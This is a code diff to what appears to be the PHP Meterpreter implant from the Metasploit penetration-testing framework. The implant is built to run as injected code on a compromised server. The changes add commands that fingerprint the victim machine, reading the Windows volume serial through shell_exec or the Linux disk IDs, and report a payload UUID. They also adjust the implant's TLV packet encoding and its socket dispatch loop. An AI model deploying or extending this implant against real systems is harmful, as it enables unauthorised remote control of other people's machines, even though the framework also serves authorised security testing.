@@ -1,4 +1,4 @@
-#<?php
+//<?php
 
 # Everything that needs to be global has to be made so explicitly so we can run
 # inside a call to create_user_func($user_input);
@@ -32,7 +32,7 @@ if (!isset($GLOBALS['readers'])) {
 
 # global list of extension commands
 if (!isset($GLOBALS['commands'])) {
-    $GLOBALS['commands'] = array("core_loadlib");
+    $GLOBALS['commands'] = array("core_loadlib", "core_machine_id", "core_uuid");
 }
 
 function register_command($c) {
@@ -99,18 +99,21 @@ function socket_set_option($sock, $type, $opt, $value) {
 }
 }
 
+#
+# Payload definitions
+#
+define("PAYLOAD_UUID", "");
 
 #
 # Constants
 #
-define("PACKET_TYPE_REQUEST",0);
-define("PACKET_TYPE_RESPONSE",1);
-define("PACKET_TYPE_PLAIN_REQUEST", 10);
+define("PACKET_TYPE_REQUEST",         0);
+define("PACKET_TYPE_RESPONSE",        1);
+define("PACKET_TYPE_PLAIN_REQUEST",  10);
 define("PACKET_TYPE_PLAIN_RESPONSE", 11);
 
-define("ERROR_SUCCESS",0);
-# not defined in original C implementation
-define("ERROR_FAILURE",1);
+define("ERROR_SUCCESS", 0);
+define("ERROR_FAILURE", 1);
 
 define("CHANNEL_CLASS_BUFFERED", 0);
 define("CHANNEL_CLASS_STREAM",   1);
@@ -125,6 +128,7 @@ define("TLV_META_TYPE_STRING",     (1 << 16));
 define("TLV_META_TYPE_UINT",       (1 << 17));
 define("TLV_META_TYPE_RAW",        (1 << 18));
 define("TLV_META_TYPE_BOOL",       (1 << 19));
+define("TLV_META_TYPE_QWORD",      (1 << 20));
 define("TLV_META_TYPE_COMPRESSED", (1 << 29));
 define("TLV_META_TYPE_GROUP",      (1 << 30));
 define("TLV_META_TYPE_COMPLEX",    (1 << 31));
@@ -173,6 +177,9 @@ define("TLV_TYPE_LIBRARY_PATH",        TLV_META_TYPE_STRING | 400);
 define("TLV_TYPE_TARGET_PATH",         TLV_META_TYPE_STRING | 401);
 define("TLV_TYPE_MIGRATE_PID",         TLV_META_TYPE_UINT   | 402);
 define("TLV_TYPE_MIGRATE_LEN",         TLV_META_TYPE_UINT   | 403);
+
+define("TLV_TYPE_MACHINE_ID",          TLV_META_TYPE_STRING | 460);
+define("TLV_TYPE_UUID",                TLV_META_TYPE_RAW    | 461);
 
 define("TLV_TYPE_CIPHER_NAME",         TLV_META_TYPE_STRING | 500);
 define("TLV_TYPE_CIPHER_PARAMETERS",   TLV_META_TYPE_GROUP  | 501);
@@ -418,8 +425,41 @@ function core_loadlib($req, &$pkt) {
 }
 
 
+function core_uuid($req, &$pkt) {
+    my_print("doing core_uuid");
+    packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, PAYLOAD_UUID));
+    return ERROR_SUCCESS;
+}
 
 
+function get_hdd_label() {
+  foreach (scandir('/dev/disk/by-id/') as $file) {
+    foreach (array("ata-", "mb-") as $prefix) {
+      if (strpos($file, $prefix) === 0) {
+        return substr($file, strlen($prefix));
+      }
+    }
+  }
+  return "";
+}
+
+function core_machine_id($req, &$pkt) {
+  my_print("doing core_machine_id");
+  $machine_id = gethostname();
+  $serial = "";
+
+  if (is_windows()) {
+    # It's dirty, but there's not really a nicer way of doing this on windows. Make sure
+    # it's lowercase as this is what the other meterpreters use.
+    $output = strtolower(shell_exec("vol %SYSTEMDRIVE%"));
+    $serial = preg_replace('/.*serial number is ([a-z0-9]{4}-[a-z0-9]{4}).*/s', '$1', $output);
+  } else {
+    $serial = get_hdd_label();
+  }
+
+  packet_add_tlv($pkt, create_tlv(TLV_TYPE_MACHINE_ID, $serial.":".$machine_id));
+  return ERROR_SUCCESS;
+}
 
 
 ##
@@ -655,6 +695,11 @@ function tlv_pack($tlv) {
     if (($tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING) {
         $ret = pack("NNa*", 8 + strlen($tlv['value'])+1, $tlv['type'], $tlv['value'] . "\0");
     }
+    elseif (($tlv['type'] & TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD) {
+        $hi = ($tlv['value'] >> 32) & 0xFFFFFFFF;
+        $lo = $tlv['value'] & 0xFFFFFFFF;
+        $ret = pack("NNNN", 8 + 8, $tlv['type'], $hi, $lo);
+    }
     elseif (($tlv['type'] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT) {
         $ret = pack("NNN", 8 + 4, $tlv['type'], $tlv['value']);
     }
@@ -686,9 +731,16 @@ function tlv_unpack($raw_tlv) {
     my_print("len: {$tlv['len']}, type: {$tlv['type']}");
     if (($type & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING) {
         $tlv = unpack("Nlen/Ntype/a*value", substr($raw_tlv, 0, $tlv['len']));
+        # PHP 5.5.0 modifed the 'a' unpack format to stop removing the trailing
+        # NULL, so catch that here
+        $tlv['value'] = str_replace("\0", "", $tlv['value']);
     }
     elseif (($type & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT) {
         $tlv = unpack("Nlen/Ntype/Nvalue", substr($raw_tlv, 0, $tlv['len']));
+    }
+    elseif (($type & TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD) {
+        $tlv = unpack("Nlen/Ntype/Nhi/Nlo", substr($raw_tlv, 0, $tlv['len']));
+        $tlv['value'] = $tlv['hi'] << 32 | $tlv['lo'];
     }
     elseif (($type & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL) {
         $tlv = unpack("Nlen/Ntype/cvalue", substr($raw_tlv, 0, $tlv['len']));
@@ -907,11 +959,12 @@ function read($resource, $len=null) {
         # whole php process will block waiting for data that may never come.
         # Unfortunately, selecting on pipes created with proc_open on Windows
         # always returns immediately.  Basically, shell interaction in Windows
-        # is hosed until this gets figured out.  See https://dev.metasploit.com/redmine/issues/2232
+        # is hosed until this gets figured out.
         $r = Array($resource);
         my_print("Calling select to see if there's data on $resource");
         while (true) {
-            $cnt = stream_select($r, $w=NULL, $e=NULL, 0);
+            $w=NULL;$e=NULL;$t=0;
+            $cnt = stream_select($r, $w, $e, $t);
 
             # Stream is not ready to read, have to live with what we've gotten
             # so far
@@ -1147,7 +1200,8 @@ add_reader($msgsock);
 # Main dispatch loop
 #
 $r=$GLOBALS['readers'];
-while (false !== ($cnt = select($r, $w=null, $e=null, 1))) {
+$w=NULL;$e=NULL;$t=1;
+while (false !== ($cnt = select($r, $w, $e, $t))) {
     #my_print(sprintf("Returned from select with %s readers", count($r)));
     $read_failed = false;
     for ($i = 0; $i < $cnt; $i++) {
